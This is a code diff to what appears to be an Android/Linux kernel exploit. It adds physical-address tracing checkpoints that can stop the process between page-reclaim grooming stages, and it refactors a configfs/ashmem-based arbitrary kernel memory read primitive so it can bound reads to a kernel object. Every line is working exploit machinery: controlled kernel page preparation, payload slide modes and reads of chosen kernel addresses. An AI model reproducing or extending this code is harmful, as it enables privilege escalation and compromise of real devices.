@@ -331,6 +331,7 @@ int data_alias_uses_slide = 1;
 #endif
 int data_addr_canonical;
 int app_fops_reused_page_ready;
+int p0_prepare_only_active;
 char ashmem_path[256] = "/dev/ashmem";
 
 int app_fops_page_reuse_enabled(void) {
@@ -1502,6 +1503,41 @@ static int drain_controlled_mm_group(
   return 1;
 }
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+static int p0_prepare_trace_stops_enabled(void) {
+  const char *trace_stops = getenv("RMG_P0_PREPARE_TRACE_STOPS");
+  return trace_stops && *trace_stops && strcmp(trace_stops, "0") != 0;
+}
+
+static void p0_prepare_trace_checkpoint(const char *stage, uintptr_t base) {
+  if (base < P0_PAGE_OFFSET) {
+    pr_warning("p0 prepare-only checkpoint stage=%s invalid_base=%016zx\n",
+               stage, base);
+    return;
+  }
+
+  unsigned long long phys =
+      (unsigned long long)(base - P0_PAGE_OFFSET) + P0_PHYS_OFFSET;
+  unsigned long long pfn = phys >> PAGE_SHIFT;
+  int stop = p0_prepare_trace_stops_enabled();
+  pr_success("p0 prepare-only checkpoint stage=%s pid=%d direct=%016zx "
+             "phys=%016llx pfn=0x%llx pages=%lu cpu=%d stop=%d\n",
+             stage, getpid(), base, phys, pfn,
+             (unsigned long)(ORDER3_SIZE / PAGE_SIZE), sched_getcpu(), stop);
+  SYSCHK(fflush(NULL));
+  if (!stop) {
+    return;
+  }
+
+  pr_info("p0 prepare-only checkpoint stage=%s state=stopping pid=%d\n",
+          stage, getpid());
+  SYSCHK(fflush(NULL));
+  SYSCHK(syscall(SYS_kill, getpid(), SIGSTOP));
+  pr_info("p0 prepare-only checkpoint stage=%s state=resumed pid=%d cpu=%d\n",
+          stage, getpid(), sched_getcpu());
+}
+#endif
+
 #if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
 struct reclaim_tracefs_gate {
   int enabled;
@@ -2154,6 +2190,12 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
     return 0;
   }
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (p0_prepare_only_active && payload_mode == PAGE_PAYLOAD_SLIDE) {
+    p0_prepare_trace_checkpoint("pre-drain", base);
+  }
+#endif
+
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
   SYSCHK(setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF,
                     &sndbuf, sizeof(sndbuf)));
@@ -2220,6 +2262,11 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
       sent_count++;
     }
   }
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (p0_prepare_only_active && payload_mode == PAGE_PAYLOAD_SLIDE) {
+    p0_prepare_trace_checkpoint("post-reclaim", base);
+  }
+#endif
 #if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
   int trace_ok = reclaim_tracefs_finish(&trace_gate);
 #endif
@@ -2834,10 +2881,14 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   return wr;
 }
 
-ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
+static ssize_t configfs_read_once_internal(
+    int fd, uintptr_t target, void *data, size_t len, size_t object_size) {
   unsigned char blob[128];
   uintptr_t page = 0;
   off_t pos = 0;
+  uint64_t window_end = len + 0x10000;
+  uint64_t max_safe_window = window_end - 1;
+  int window_bounded = 0;
 
   if (!data || !len || len > SSIZE_MAX) {
     errno = EINVAL;
@@ -2849,9 +2900,30 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
     return -1;
   }
 
+  if (object_size) {
+    if (object_size & (object_size - 1)) {
+      errno = EINVAL;
+      return -1;
+    }
+    uint64_t object_offset = target & (object_size - 1);
+    uint64_t object_remaining = object_size - object_offset;
+    window_bounded = 1;
+    max_safe_window = object_remaining;
+    if (object_remaining < len) {
+      pr_warning("configfs read rejected object span target=%016zx "
+                 "len=%zu remaining=%llu\n",
+                 target, len, (unsigned long long)object_remaining);
+      errno = EOVERFLOW;
+      return -1;
+    }
+    if (window_end > object_remaining + 1) {
+      window_end = object_remaining + 1;
+    }
+  }
+
   memset(blob, 0, sizeof(blob));
   memset(blob, 1, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN);
-  for (uint64_t window = len; window < len + 0x10000; ++window) {
+  for (uint64_t window = len; window < window_end; ++window) {
     uintptr_t candidate_pos = ASHMEM_PREFIX_COUNT - window;
     if (target < candidate_pos) {
       continue;
@@ -2872,7 +2944,14 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
     }
   }
   if (!page) {
-    errno = ERANGE;
+    if (window_bounded) {
+      pr_warning("configfs read rejected unsafe window target=%016zx "
+                 "len=%zu max=%llu\n",
+                 target, len, (unsigned long long)max_safe_window);
+      errno = EOVERFLOW;
+    } else {
+      errno = ERANGE;
+    }
     return -1;
   }
   put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
@@ -2888,6 +2967,16 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   errno = 0;
   ssize_t rd = pread(fd, data, len, pos);
   return rd;
+}
+
+ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
+  return configfs_read_once_internal(fd, target, data, len, 0);
+}
+
+ssize_t configfs_read_object_once(
+    int fd, uintptr_t target, void *data, size_t len, size_t object_size) {
+  return configfs_read_once_internal(
+      fd, target, data, len, object_size);
 }
 
 int is_direct_ptr(uintptr_t value) {
